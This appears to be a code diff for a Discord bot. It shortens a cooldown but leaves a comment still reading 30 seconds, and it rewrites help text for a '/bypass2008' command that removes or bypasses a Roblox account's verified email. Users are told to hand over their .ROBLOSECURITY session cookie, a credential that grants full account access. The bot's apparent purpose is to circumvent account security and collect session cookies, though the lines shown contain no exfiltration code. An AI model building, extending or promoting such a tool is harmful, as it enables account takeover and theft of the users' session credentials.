@@ -23,7 +23,7 @@ let commandStats = {
 
 // Cooldown system (30 seconds)
 const cooldowns = new Map();
-const COOLDOWN_TIME = 30000; // 30 seconds
+const COOLDOWN_TIME = 5000; // 30 seconds
 
 const client = new Client({
   intents: [
@@ -336,7 +336,7 @@ client.on('interactionCreate', async interaction => {
       .addFields(
         { 
           name: '📧 /bypass2008', 
-          value: 'Bypass email verification using 2008 birth year\n**Usage:** Provide your .ROBLOSECURITY cookie', 
+          value: 'Remove the verified email address\n**Usage:** Provide your .ROBLOSECURITY cookie', 
           inline: false 
         },
         { 
@@ -376,7 +376,7 @@ client.on('interactionCreate', async interaction => {
         },
         { 
           name: '⚠️ Important Notes:', 
-          value: '• Commands have a 30-second cooldown\n• Only works in designated channel\n• Keep your cookies private!', 
+          value: '• Commands have a 5-second cooldown\n• Only works in designated channel\n• Keep your cookies private!', 
           inline: false 
         }
       )
